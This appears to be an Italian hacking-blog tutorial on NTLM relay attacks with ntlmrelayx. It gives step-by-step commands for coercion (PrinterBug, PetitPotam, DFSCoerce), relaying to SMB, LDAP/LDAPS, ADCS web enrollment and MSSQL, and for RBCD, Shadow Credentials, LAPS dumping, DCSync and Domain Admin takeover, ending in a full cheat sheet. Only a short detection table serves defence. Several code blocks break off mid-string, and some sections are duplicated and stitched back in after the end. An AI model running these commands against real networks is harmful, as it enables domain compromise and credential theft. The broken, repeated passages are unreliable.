---
title: 'ntlmrelayx: NTLM Relay Attack - Setup e Bypass 2026'
slug: ntlm-relay
description: 'Guida completa al NTLM Relay Attack con ntlmrelayx: coercizione (PetitPotam, PrinterBug), relay SMB/LDAP/ADCS (ESC8), RBCD, Shadow Credentials e DCSync. Workflow da rete interna a Domain Admin.'
image: /ntlm-relay-attack-responder-ntlmrelayx.webp
draft: false
date: 2026-06-18T00:00:00.000Z
lastmod: 2026-06-27T00:00:00.000Z
categories:
  - networking
subcategories:
  - servizi
tags:
  - ntlmrelayx
  - smb relay
  - responder NTLM
  - relay attack Active Directory 2026
---

# ntlmrelayx.py — Guida Completa al NTLM Relay con Impacket

> **TL;DR:** `ntlmrelayx.py` intercetta autenticazioni NTLM e le rilancia verso un servizio target senza conoscere la password. Con coercizione forzata, puoi far autenticare un Domain Controller verso di te e arrivare a Domain Admin in pochi minuti — sfruttando misconfiguration, non zero-day.

`ntlmrelayx.py` fa parte di [Impacket](https://hackita.it/articoli/impacket/) ed è lo strumento più completo per attacchi NTLM relay. Non è uno strumento singolo: è un sistema a tre layer. Capire questa architettura è quello che separa chi usa ntlmrelayx meccanicamente da chi sa perché ogni relay funziona o fallisce.

Riferimento ufficiale: [fortra/impacket — ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)\


***

## Architettura: ntlmrelayx è 3 cose insieme

```
┌─────────────────────────────────────────────────┐
│           LAYER 1 — CAPTURE ENGINE              │
│  SMB Server │ HTTP Server │ WCF Server │ RAW    │
│  (porta 445)  (porta 80)   (.NET WCF)  (6666)  │
│  Riceve l'autenticazione NTLM dal victim        │
└──────────────────────┬──────────────────────────┘
                       │
┌──────────────────────▼──────────────────────────┐
│           LAYER 2 — RELAY ENGINE                │
│  Inoltra challenge/response NTLM al target      │
│  senza mai vedere la password                   │
│  Implementa CVE-2019-1040 (--remove-mic)        │
└──────────────────────┬──────────────────────────┘
                       │
┌──────────────────────▼──────────────────────────┐
│        LAYER 3 — PROTOCOL HANDLER + ACTIONS     │
│  SMB  │ LDAP │ LDAPS │ HTTP │ MSSQL │ IMAP      │
│  Esegue azioni post-relay specifiche per        │
│  protocollo: dump, RBCD, exec, ADCS cert...     │
└─────────────────────────────────────────────────┘
```

Il **perché funziona** sta tutto qui: NTLM è un protocollo challenge-response che non lega l'autenticazione al canale di rete (salvo EPA/Channel Binding). ntlmrelayx cattura il flow auth nel Layer 1 e lo riusa identico verso un target diverso nel Layer 2. Il Layer 3 decide cosa fare dopo l'accesso ottenuto.

***

## I protocolli target — comportamento, requisiti, impatto

Questa è la parte che devi capire prima di scegliere il target. Ogni protocollo ha regole diverse su quando il relay è possibile e cosa puoi fare dopo.

### SMB (`smb://`)

**Perché funziona:** SMB permette session setup via NTLM. La firma del messaggio (signing) è opzionale e disabilitata per default su workstation e server non-DC. Senza firma, l'autenticazione relayata è indistinguibile da una legittima.

**Perché fallisce:** SMB signing obbligatorio (tutti i DC di default, opzione Group Policy) lega l'NTLM al canale SMB tramite firma crittografica — il relay verrebbe rigettato.

```
SMB signing OFF → relay funziona → esegui comandi, dumpa SAM, accedi ai file
SMB signing ON  → relay rigettato → cambia target
```

| Cosa puoi fare                  | Requisito                           |
| ------------------------------- | ----------------------------------- |
| Esecuzione comandi (`-c`)       | Local admin sul target              |
| SAM/LSA dump automatico         | Local admin sul target              |
| Accesso file share              | Qualsiasi utente con permessi share |
| Enumerazione utenti (non-admin) | Qualsiasi account di dominio        |
| Interactive shell (`-i`)        | Local admin (per write)             |

```bash
# SAM dump automatico — il più usato
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support

# Esecuzione comando immediata
sudo ntlmrelayx.py -t smb://10.10.10.20 -smb2support \
  -c "whoami && net localgroup Administrators"

# Aggiunta utente admin locale
sudo ntlmrelayx.py -t smb://10.10.10.20 -smb2support \
  -c "net user attacker Pass123! /add && net localgroup Administrators attacker /add"

# Shell interattiva → accesso file, upload/download
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -i
nc 127.0.0.1 11000   # → smb> shares / ls / get / put

# SOCKS per tool multipli sulla stessa sessione
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -socks
proxychains impacket-secretsdump -no-pass CORP/admin@10.10.10.20
```

***

### LDAP (`ldap://`)

**Perché funziona:** LDAP accetta autenticazione NTLM nativa (LDAP bind via NTLM). Il signing LDAP è configurabile — molti ambienti lo hanno non forzato per compatibilità legacy.

**Perché fallisce:** se LDAP signing è richiesto (`ldapServerIntegrity = 2`), ogni operazione di scrittura viene rigettata. Le operazioni di solo lettura/dump possono funzionare anche con signing richiesto in certi scenari.

```
LDAP signing OFF → relay funziona → modifica AD, RBCD, dump
LDAP signing ON  → solo dump possibile → per write usa LDAPS
```

| Cosa puoi fare                  | Requisito                                           |
| ------------------------------- | --------------------------------------------------- |
| Dump utenti/gruppi/struttura AD | Account autenticato                                 |
| Crea utente dominio             | Permessi sufficienti                                |
| Aggiunta a Domain Admins        | Privilegi elevati sull'account relayed              |
| RBCD setup                      | Write su msDS-AllowedToActOnBehalfOfOtherIdentity   |
| Dump LAPS                       | `ms-Mcs-AdmPwd` leggibile                           |
| Shadow Credentials              | Write su msDS-KeyCredentialLink (non su LDAP plain) |

```bash
# Dump struttura AD + tentativo aggiunta DA (automatico)
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support

# Dump LAPS — password admin locali in chiaro
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-laps

# Dump gMSA
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-gmsa

# Crea computer account (per RBCD manuale successivo)
sudo ntlmrelayx.py -t ldaps://10.10.10.5 -smb2support \
  --add-computer 'EVIL

---

### LDAPS (`ldaps://`)

**Perché funziona:** LDAPS è LDAP over TLS. Non ha lo stesso problema di signing — la cifratura TLS del canale non è legata crittograficamente all'autenticazione NTLM (salvo Channel Binding / CBT attivo). Permette tutte le operazioni write che LDAP con signing blocca.

**Perché fallisce:** LDAP Channel Binding (CBT) tying lega l'autenticazione NTLM al certificato TLS del server — il relay viene rigettato perché l'attaccante non ha il certificato del DC. Abilitato su DC moderni con patch recenti.

```

LDAPS senza CBT → relay funziona + write complete → RBCD, Shadow Creds, user creation
LDAPS con CBT   → relay rigettato → usa HTTP/ADCS

````

| Cosa puoi fare | Requisito |
|----------------|-----------|
| Tutto ciò che LDAP permette | + |
| Shadow Credentials | Write su msDS-KeyCredentialLink |
| Add computer account | MachineAccountQuota > 0 |
| RBCD completo | Write sul computer object target |

```bash
# RBCD — crea computer + configura delega (poi usa getST)
sudo ntlmrelayx.py -t ldaps://10.10.10.5 -smb2support --delegate-access

# Shadow Credentials su LDAPS (più affidabile che su LDAP plain)
sudo ntlmrelayx.py -t ldaps://10.10.10.5 -smb2support \
  --shadow-credentials --shadow-target 'DC01

---

### HTTP / HTTPS (`http://` / `https://`)

**Perché funziona:** HTTP non supporta message signing — non esiste un meccanismo equivalente a SMB signing o LDAP signing. Questo significa che **qualsiasi** autenticazione NTLM su HTTP può essere relayata, indipendentemente dalla configurazione del dominio. È per questo che ESC8 è così devastante: il Web Enrollment di AD CS accetta NTLM su HTTP per default.

**Perché fallisce:** EPA (Extended Protection for Authentication) su HTTPS lega il token NTLM al canale TLS — il relay viene rigettato. Se il CA ha EPA abilitato, ESC8 non funziona.

````

HTTP senza EPA  → relay SEMPRE possibile → ADCS, Exchange, OWA, web app
HTTP con EPA    → relay rigettato

````

| Target HTTP | Vettore |
|-------------|---------|
| AD CS Web Enrollment (`/certsrv/`) | ESC8 → certificato per DC$ → DCSync |
| Exchange EWS | Accesso mailbox, lateral movement |
| OWA (Outlook Web App) | Accesso email |
| IIS con NTLM auth | Accesso app |
| WPAD | Cattura hash durante browsing |

```bash
# ESC8 — relay verso Web Enrollment AD CS
sudo ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp \
  --adcs --template DomainController -smb2support

# Verifica prima se il CA ha EPA disabilitato
curl -I http://CA_IP/certsrv/
# → "WWW-Authenticate: NTLM" = vulnerabile

# Dopo aver ricevuto il certificato (Base64 nel log):
# Converti e autenticati
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.5
# → ottieni NT hash + TGT del DC01$

# DCSync con il ticket ottenuto
impacket-secretsdump -k -no-pass -just-dc-ntlm \
  corp.local/'DC01

---

## Decision tree — cosa usi in base a cosa trovi

````

HAI UN'AUTENTICAZIONE NTLM (da Responder/coercizione)?
│
├── Target ha SMB signing OFF?
│   └── SÌ → SMB relay → SAM dump, exec, file access
│           → ntlmrelayx.py -tf relay.txt -smb2support
│
├── Target ha LDAP signing OFF?
│   └── SÌ (write) → LDAP relay → RBCD, dump, user creation
│           → ntlmrelayx.py -t ldap\://DC\_IP -smb2support
│       └── LDAPS senza CBT → ancora meglio → Shadow Credentials + RBCD
│               → ntlmrelayx.py -t ldaps\://DC\_IP -smb2support
│
├── AD CS Web Enrollment esposto (ESC8)?
│   └── SÌ → HTTP relay → certificato DC$ → DCSync completo
│           → ntlmrelayx.py -t http\://CA\_IP/certsrv/certfnsh.asp --adcs --template DomainController -smb2support
│
├── SQL Server con Windows Auth?
│   └── SÌ → MSSQL relay → login → se sysadmin → xp\_cmdshell
│           → ntlmrelayx.py -t mssql://SQL\_IP -smb2support -socks
│
├── Exchange / OWA esposto?
│   └── SÌ → HTTP relay → accesso mailbox
│
├── Nulla funziona con questa autenticazione?
│   └── Cambia vittima della coercizione
│       → Coerci un account con più privilegi (machine account, service account)
│       → WebDAV coercion per bypassare SMB signing
│       → --remove-mic per cross-protocol relay
│
└── SMB signing ovunque + LDAP signing + no ADCS?
└── mitm6 → LDAPS relay → RBCD → getST → DA

````

---

## Step 0 — Verifica prima di tutto

```bash
# SMB signing — genera target list direttamente
nxc smb 10.10.10.0/24 --gen-relay-list /tmp/relay_targets.txt
# "signing:False" → relay target

# Verifica LDAP signing sul DC
nxc ldap 10.10.10.5 -u user -p pass -M ldap-checker
# "LDAP Signing: NOT required" → relay LDAP possibile

# Verifica ESC8 (Web Enrollment senza EPA)
curl -I http://CA_IP/certsrv/
# "WWW-Authenticate: NTLM" → ESC8 vulnerabile

# Verifica WebClient (WebDAV) sulle workstation
nxc smb 10.10.10.0/24 -u user -p pass -M webdav

# Verifica MachineAccountQuota (per RBCD)
nxc ldap 10.10.10.5 -u user -p pass -M maq
````

***

## Step 1 — Cattura l'autenticazione NTLM

### Responder — LLMNR/NBT-NS poisoning (passivo)

[Responder](https://hackita.it/articoli/responder/) avvelena le risoluzioni DNS fallite. Quando un host non trova `\\TYPO` via DNS, manda un broadcast LLMNR — Responder risponde e cattura l'autenticazione. **Devi** disabilitare SMB e HTTP perché ntlmrelayx deve gestire quelle porte.

```bash
# Configura Responder
sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf
sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf

# Lancia in poisoning mode
sudo responder -I eth0 -rdwv

# Solo ascolto (recon senza poisoning)
sudo responder -I eth0 -A
```

### mitm6 — DHCPv6 poisoning

Windows preferisce IPv6 su IPv4. mitm6 risponde alle richieste DHCPv6 dichiarandosi DNS server IPv6 e avvelena le risoluzioni. Funziona anche con LLMNR disabilitato.

```bash
pip3 install mitm6
sudo mitm6 -d corp.local -i eth0

# ntlmrelayx deve girare con -6
sudo ntlmrelayx.py -6 -t ldaps://10.10.10.5 --delegate-access -smb2support
```

> mitm6 non è immediato: Windows rinnova DHCP al reboot o a eventi di rete. Aspetta 5–30 minuti.

***

## Step 2 — Tecniche di coercizione (autenticazione forzata)

La coercizione forza un host specifico (anche il DC) ad autenticarsi verso di te senza aspettare. Richiede credenziali low-privilege di dominio.

### PrinterBug / SpoolSample (MS-RPRN)

Abusa il Print Spooler. Il target torna verso l'attaccante con il proprio machine account. Richiede Print Spooler attivo.

```bash
python3 printerbug.py corp.local/user:Password123@10.10.10.5 10.10.14.1
# 10.10.10.5 = host da coercere (es. DC)
# 10.10.14.1 = IP attaccante

# Verifica se Print Spooler è attivo
nxc smb 10.10.10.5 -u user -p pass -M spooler
```

### PetitPotam (MS-EFSR)

Abusa EFS (Encrypting File System). La versione **autenticata** funziona anche post-patch.

```bash
# Autenticata (funziona post-CVE-2022-26925)
python3 PetitPotam.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5

# Unauthenticated (solo sistemi non patchati)
python3 PetitPotam.py 10.10.14.1 10.10.10.5

# WebDAV variant — esce via HTTP invece di SMB (bypassa SMB signing!)
python3 PetitPotam.py -u user -p pass -d corp.local ATTACKER@80/test 10.10.10.5
```

### DFSCoerce (MS-DFSNM)

Non patchato — funziona su sistemi aggiornati.

```bash
python3 dfscoerce.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5
```

### ShadowCoerce (MS-FSRVP)

```bash
python3 shadowcoerce.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5
```

### Coercer — aggrega tutti i metodi

[Coercer](https://github.com/p0dalirius/Coercer) testa automaticamente 12+ metodi e usa quello che funziona.

```bash
pip3 install coercer

# Scan — verifica senza coercere
python3 Coercer.py scan -t 10.10.10.5 -u user -p Password123 -d corp.local -v

# Coerce con tutti i metodi
python3 Coercer.py coerce -t 10.10.10.5 -l 10.10.14.1 \
  -u user -p Password123 -d corp.local --always-continue
```

### WebDAV coercion — bypassa SMB signing

Se WebClient è attivo, la coercizione esce via HTTP (porta 80) invece di SMB. HTTP non ha signing → puoi relayarla anche quando SMB signing è richiesto ovunque.

```bash
# Verifica WebClient
nxc smb 10.10.10.0/24 -u user -p pass -M webdav

# ntlmrelayx ascolta su HTTP
sudo ntlmrelayx.py -t ldaps://10.10.10.5 --delegate-access --http-port 80 -smb2support

# Coercione verso HTTP (WebDAV)
python3 PetitPotam.py -u user -p pass -d corp.local ATTACKER@80/test WS01_IP
```

***

## Opzioni globali ntlmrelayx

| Opzione            | Descrizione                                            |
| ------------------ | ------------------------------------------------------ |
| `-t TARGET`        | Target singolo                                         |
| `-tf FILE`         | File con lista target                                  |
| `-smb2support`     | **Sempre mettilo** — abilita SMB2                      |
| `-6`               | Supporto IPv6 (per mitm6)                              |
| `-i`               | Shell interattiva → accessibile via nc                 |
| `-socks`           | Mantieni sessione aperta per proxychains               |
| `-c COMANDO`       | Esegui comando su relay SMB                            |
| `-e FILE`          | Carica ed esegui file sul target                       |
| `--remove-mic`     | Rimuovi MIC (CVE-2019-1040) — per cross-protocol relay |
| `--no-dump`        | Non fare SAM dump automatico                           |
| `--no-da`          | Non tentare aggiunta a Domain Admins                   |
| `--no-acl`         | Non modificare ACL                                     |
| `-w`               | Monitora file target per aggiornamenti live            |
| `--http-port PORT` | Porta HTTP listener                                    |
| `--no-http-server` | Disabilita HTTP server                                 |
| `--no-smb-server`  | Disabilita SMB server                                  |

***

## Scenario 1 — SMB Relay → SAM dump + exec

```bash
# SAM dump automatico su tutti i target
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support

# Con exec
sudo ntlmrelayx.py -t smb://10.10.10.20 -smb2support \
  -c "net user attacker Pass123! /add && net localgroup Administrators attacker /add"

# Interactive shell
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -i
# → nc 127.0.0.1 11000
```

### Cosa fare con gli hash SAM

```bash
nxc smb 10.10.10.0/24 -u Administrator -H NThash --local-auth
impacket-secretsdump corp.local/administrator:pass@10.10.10.20
```

***

## Scenario 2 — SOCKS mode → accesso persistente

```bash
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -socks

# Lista sessioni attive
ntlmrelayx> socks

# Via proxychains — usa qualsiasi tool come se fossi autenticato
echo "socks4 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains -q impacket-secretsdump -no-pass CORP/admin@TARGET
proxychains -q nxc smb TARGET -u admin -p '' --no-bruteforce
```

***

## Scenario 3 — LDAP Relay → RBCD → Domain Admin

```bash
# Step 1 — relay LDAPS con --delegate-access
sudo ntlmrelayx.py -t ldaps://10.10.10.5 --delegate-access -smb2support -6

# Step 2 — mitm6 o coercizione per far autenticare WS01$
sudo mitm6 -d corp.local -i eth0
# Quando WS01$ autentica:
# [*] Adding new computer: XEWRIYIH$ with password: Rand0mP@ss!
# [*] Delegating to WS01$ via msDS-AllowedToActOnBehalfOfOtherIdentity

# Step 3 — getST e accesso come Administrator
impacket-getST -spn cifs/WS01.corp.local -impersonate Administrator \
  -dc-ip 10.10.10.5 corp.local/'XEWRIYIH$':'Rand0mP@ss!'
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@WS01.corp.local
```

Flusso completo in [RBCD](https://hackita.it/articoli/rbcd/) e [getST.py](https://hackita.it/articoli/getst/).

***

## Scenario 4 — LDAPS Relay → Shadow Credentials

Più stealth di RBCD — non crea computer account.

```bash
sudo ntlmrelayx.py -t ldaps://10.10.10.5 \
  --shadow-credentials --shadow-target 'WS01$' \
  --pfx-password 'CertPass123' --export-type PEM \
  --cert-outfile-path /tmp/ws01_shadow -smb2support

# Usa il certificato
python3 gettgtpkinit.py -cert-pfx /tmp/ws01_shadow.pfx -pfx-pass 'CertPass123' \
  corp.local/'WS01$' /tmp/ws01.ccache
KRB5CCNAME=/tmp/ws01.ccache python3 getnthash.py -key AS_REP_KEY corp.local/'WS01$'
nxc smb WS01.corp.local -u 'WS01$' -H NThash
```

Dettagli in [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/).

***

## Scenario 5 — LDAP Relay → Dump LAPS / gMSA / ADCS info

```bash
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-laps
# Hostname        | AdmPwd
# WS01.corp.local | R@nd0mL@ps!

sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-gmsa
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-adcs   # template ESC info
sudo ntlmrelayx.py -t ldaps://10.10.10.5 -smb2support --add-computer 'EVIL$' 'EvilPass123!'
```

***

## Scenario 6 — HTTP Relay → ESC8 (AD CS) → DCSync

Questo scenario non dipende da SMB signing o LDAP signing — HTTP non ha signing, funziona sempre se EPA non è attivo sul CA.

```bash
# Step 1 — Verifica
curl -I http://CA_IP/certsrv/
# WWW-Authenticate: NTLM → vulnerabile

# Step 2 — ntlmrelayx verso Web Enrollment
sudo ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp \
  --adcs --template DomainController -smb2support

# Step 3 — Coerci il DC verso l'attaccante
python3 PetitPotam.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5

# Quando arriva autenticazione DC01$:
# [*] Certificate successfully requested
# [*] Base64 certificate of user DC01$: MIIRLAIBAz...

# Step 4 — Autenticati come DC01$ e DCSync
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.5
# → NT hash di DC01$

KRB5CCNAME=dc01.ccache impacket-secretsdump -k -no-pass \
  -just-dc-ntlm corp.local/'DC01$'@DC01.corp.local
```

Percorso ADCS completo in [ADCS ESC1-ESC16](https://hackita.it/articoli/adcs-esc1-esc16/).

***

## Scenario 7 — MSSQL Relay → xp\_cmdshell

```bash
sudo ntlmrelayx.py -t mssql://10.10.10.30 -smb2support -socks
proxychains -q impacket-mssqlclient -no-pass -windows-auth corp.local/admin@10.10.10.30

SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami';
```

Approfondimento in [porta 1433 MSSQL](https://hackita.it/articoli/porta-1433-mssql/).

***

## Scenario 8 — Cross-protocol relay con `--remove-mic`

Quando SMB signing è richiesto ma LDAP signing non lo è, usi `--remove-mic` per strippare il MIC dall'autenticazione NTLM e relayarla cross-protocol.

```bash
# SMB → LDAP (rimuove MIC per aggirare protezione cross-protocol)
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --remove-mic

# SMB → LDAPS
sudo ntlmrelayx.py -t ldaps://10.10.10.5 -smb2support --remove-mic

# Utile anche con NTLMv1 (che non ha MIC nativamente)
```

***

## Scenario 9 — Multi-relay (-tf)

```bash
nxc smb 10.10.10.0/24 --gen-relay-list /tmp/relay.txt
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -w
# Un'unica autenticazione → relay contemporaneo su TUTTI i target
# -w aggiorna la lista live
```

***

## Limitazioni e workaround

| Protezione                      | Cosa blocca                | Workaround                                   |
| ------------------------------- | -------------------------- | -------------------------------------------- |
| SMB signing richiesto           | SMB relay                  | Relay su LDAP/HTTP/MSSQL; WebDAV coercion    |
| LDAP signing richiesto          | LDAP write relay           | Usa LDAPS; `--remove-mic` cross-protocol     |
| LDAPS Channel Binding (CBT)     | LDAPS relay                | HTTP/ADCS relay; molto difficile da aggirare |
| EPA su AD CS                    | ESC8 relay                 | Non aggirabile se configurato correttamente  |
| LLMNR/NBT-NS disabilitato       | Responder passivo          | mitm6 + coercizione attiva                   |
| PetitPotam patchato (anon)      | EFS coercion anonima       | Versione autenticata; PrinterBug; DFSCoerce  |
| Print Spooler disabilitato      | PrinterBug                 | DFSCoerce; PetitPotam autenticato; Coercer   |
| Microsoft Defender for Identity | Rileva relay + coercizione | Riduci velocità; usa sessioni esistenti      |

***

## Detection

| Tecnica                       | Event ID            | Indicatore                                                   |
| ----------------------------- | ------------------- | ------------------------------------------------------------ |
| LLMNR poisoning               | 4648                | Logon esplicito verso IP insolito                            |
| Relay SMB                     | 4624 Type 3         | Login di rete da IP attaccante                               |
| Relay LDAP                    | 4662                | Modifica msDS-AllowedToActOnBehalfOf, msDS-KeyCredentialLink |
| PetitPotam / PrinterBug       | 4769                | Machine account autentica verso IP non DC                    |
| ESC8                          | 4886                | Richiesta cert per account macchina ($) da IP insolito       |
| Shadow Credentials            | 4662                | Modifica msDS-KeyCredentialLink                              |
| RBCD                          | 4662                | Modifica msDS-AllowedToActOnBehalfOfOtherIdentity            |
| Cross-protocol (--remove-mic) | 4624 + correlazione | NTLM senza MIC su ambienti moderni                           |

***

## Workflow completo — da rete interna a Domain Admin

```
FASE 1 — RECON
├── nxc smb subnet --gen-relay-list relay.txt   → trova target SMB unsigned
├── nxc ldap DC -u user -p pass -M ldap-checker → verifica LDAP signing
├── curl -I http://CA_IP/certsrv/               → verifica ESC8
└── nxc smb subnet -M webdav                    → verifica WebDAV

FASE 2 — DECISION TREE
├── SMB signing OFF → SMB relay (più semplice)
├── LDAP signing OFF → LDAP/LDAPS relay (AD manipulation)
├── ESC8 → HTTP relay verso ADCS (più devastante)
└── Niente → mitm6 + WebDAV coercion

FASE 3 — SETUP (3 terminal paralleli)
├── T1: ntlmrelayx con target e azioni
├── T2: Responder (HTTP/SMB off) OPPURE mitm6
└── T3: coercizione attiva (PrinterBug/PetitPotam/DFSCoerce)

FASE 4 — IMPATTO
├── SMB relay → SAM dump → PtH laterale
├── LDAPS relay → RBCD/Shadow Creds → getST → DA
├── ESC8 → certificato DC$ → secretsdump → tutti gli hash
└── MSSQL → xp_cmdshell → shell

FASE 5 — PERSISTENZA
└── Hash krbtgt → Golden Ticket → /articoli/golden-ticket
```

***

## Cheat Sheet completo

```bash
# === RECON ===
nxc smb 10.10.10.0/24 --gen-relay-list /tmp/relay.txt
nxc ldap DC -u user -p pass -M ldap-checker
nxc smb subnet -u user -p pass -M webdav
curl -I http://CA_IP/certsrv/

# === SETUP RESPONDER ===
sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf
sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf
sudo responder -I eth0 -rdwv

# === COERCIZIONE ===
python3 printerbug.py corp.local/user:pass@DC_IP ATTACKER_IP
python3 PetitPotam.py -u user -p pass -d corp.local ATTACKER_IP DC_IP
python3 dfscoerce.py -u user -p pass -d corp.local ATTACKER_IP DC_IP
python3 Coercer.py coerce -t DC_IP -l ATTACKER_IP -u user -p pass -d corp.local

# === SMB RELAY ===
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support
sudo ntlmrelayx.py -t smb://TARGET -smb2support -c "whoami"
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -i   # → nc 127.0.0.1 11000
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -socks
proxychains impacket-secretsdump -no-pass CORP/admin@TARGET

# === LDAP/LDAPS RELAY ===
sudo ntlmrelayx.py -t ldap://DC_IP -smb2support              # dump + auto
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support             # write complete
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support --remove-mic # cross-protocol
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support --delegate-access -6  # RBCD
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support \
  --shadow-credentials --shadow-target 'HOST$'               # Shadow Creds
sudo ntlmrelayx.py -t ldap://DC_IP -smb2support --dump-laps
sudo ntlmrelayx.py -t ldap://DC_IP -smb2support --dump-gmsa

# === ESC8 ===
sudo ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp \
  --adcs --template DomainController -smb2support
certipy auth -pfx dc01.pfx -dc-ip DC_IP
impacket-secretsdump -k -no-pass -just-dc-ntlm corp.local/'DC01$'@DC_IP

# === MSSQL ===
sudo ntlmrelayx.py -t mssql://SQL_IP -smb2support -socks
proxychains impacket-mssqlclient -no-pass -windows-auth corp.local/admin@SQL_IP

# === IPv6 (mitm6) ===
sudo mitm6 -d corp.local -i eth0
sudo ntlmrelayx.py -6 -t ldaps://DC_IP --delegate-access -smb2support

# === RBCD CHAIN COMPLETA ===
# 1. ntlmrelayx --delegate-access → XEWRIYIH$ con password
# 2. impacket-getST -spn cifs/TARGET.corp.local -impersonate Administrator \
#      -dc-ip DC_IP corp.local/'XEWRIYIH$':'pass'
# 3. export KRB5CCNAME=Administrator.ccache
# 4. impacket-secretsdump -k -no-pass -just-dc corp.local/Administrator@DC_IP
```

**Articoli correlati:**

* [Impacket: suite completa](https://hackita.it/articoli/impacket/)
* [Responder: LLMNR/NBT-NS poisoning](https://hackita.it/articoli/responder/)
* [SMB — porta 445 e attacchi](https://hackita.it/articoli/smb/)
* [RBCD — Resource-Based Constrained Delegation](https://hackita.it/articoli/rbcd/)
* [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/)
* [getST.py — S4U2Self/S4U2Proxy](https://hackita.it/articoli/getst/)
* [ADCS ESC1-ESC16](https://hackita.it/articoli/adcs-esc1-esc16/)
* [DCSync](https://hackita.it/articoli/dcsync/)
* [addcomputer.py](https://hackita.it/articoli/addcomputer/)
* [Man-in-the-Middle: tecniche e tool](https://hackita.it/articoli/man-in-the-middle/)
* [Active Directory: exploitation](https://hackita.it/articoli/active-directory/)
* [secretsdump.py](https://hackita.it/articoli/secretsdump/)
* [Porta 1433 MSSQL](https://hackita.it/articoli/porta-1433-mssql/)

> Uso esclusivo in ambienti autorizzati.

\#impacket #ntlm-relay #active-directory #windows
'EvilPass123!'

# RBCD automatico — --delegate-access crea computer + configura delega

sudo ntlmrelayx.py -t ldaps\://10.10.10.5 -smb2support --delegate-access

# Shadow Credentials — inietta chiave in msDS-KeyCredentialLink

sudo ntlmrelayx.py -t ldaps\://10.10.10.5 -smb2support \
\--shadow-credentials --shadow-target 'WS01

***

### LDAPS (`ldaps://`)

**Perché funziona:** LDAPS è LDAP over TLS. Non ha lo stesso problema di signing — la cifratura TLS del canale non è legata crittograficamente all'autenticazione NTLM (salvo Channel Binding / CBT attivo). Permette tutte le operazioni write che LDAP con signing blocca.

**Perché fallisce:** LDAP Channel Binding (CBT) tying lega l'autenticazione NTLM al certificato TLS del server — il relay viene rigettato perché l'attaccante non ha il certificato del DC. Abilitato su DC moderni con patch recenti.

```
LDAPS senza CBT → relay funziona + write complete → RBCD, Shadow Creds, user creation
LDAPS con CBT   → relay rigettato → usa HTTP/ADCS
```

| Cosa puoi fare              | Requisito                        |
| --------------------------- | -------------------------------- |
| Tutto ciò che LDAP permette | +                                |
| Shadow Credentials          | Write su msDS-KeyCredentialLink  |
| Add computer account        | MachineAccountQuota > 0          |
| RBCD completo               | Write sul computer object target |

***

### HTTP / HTTPS (`http://` / `https://`)

**Perché funziona:** HTTP non supporta message signing — non esiste un meccanismo equivalente a SMB signing o LDAP signing. Questo significa che **qualsiasi** autenticazione NTLM su HTTP può essere relayata, indipendentemente dalla configurazione del dominio. È per questo che ESC8 è così devastante: il Web Enrollment di AD CS accetta NTLM su HTTP per default.

**Perché fallisce:** EPA (Extended Protection for Authentication) su HTTPS lega il token NTLM al canale TLS — il relay viene rigettato. Se il CA ha EPA abilitato, ESC8 non funziona.

```
HTTP senza EPA  → relay SEMPRE possibile → ADCS, Exchange, OWA, web app
HTTP con EPA    → relay rigettato
```

| Target HTTP                        | Vettore                             |
| ---------------------------------- | ----------------------------------- |
| AD CS Web Enrollment (`/certsrv/`) | ESC8 → certificato per DC$ → DCSync |
| Exchange EWS                       | Accesso mailbox, lateral movement   |
| OWA (Outlook Web App)              | Accesso email                       |
| IIS con NTLM auth                  | Accesso app                         |
| WPAD                               | Cattura hash durante browsing       |

***

### MSSQL (`mssql://`)

**Perché funziona:** SQL Server supporta Windows Authentication via NTLM come metodo legacy. Non ha signing equivalente a SMB. Un relay NTLM verso SQL Server viene accettato come autenticazione Windows legittima.

**Perché fallisce:** se SQL Server usa solo SQL Authentication (non Windows Auth), il relay NTLM non ha senso. Se l'account relayed non ha permessi sul DB, ottieni accesso limitato.

```
MSSQL con Windows Auth → relay funziona → login SQL
Account relayed = sysadmin → xp_cmdshell → RCE
```

| Cosa puoi fare      | Requisito                 |
| ------------------- | ------------------------- |
| Login al database   | Windows Auth abilitata    |
| Query dati          | Permessi SELECT           |
| `xp_cmdshell` → RCE | sysadmin role             |
